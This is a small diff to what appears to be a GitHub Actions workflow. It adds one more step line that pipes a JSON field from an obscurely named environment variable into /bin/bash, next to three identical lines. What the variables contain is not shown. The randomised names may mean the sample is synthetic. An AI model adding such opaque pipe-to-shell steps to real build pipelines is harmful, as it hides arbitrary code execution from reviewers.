@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$xg9028" | jq -r .dfku1 | /bin/bash
           printf '%s' "$x5" | jq -r .tho937 | /bin/bash
           echo $n45012 | jq -r .jloq1 | /bin/bash
+          echo $mgcsc1 | jq -r .ipue438 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
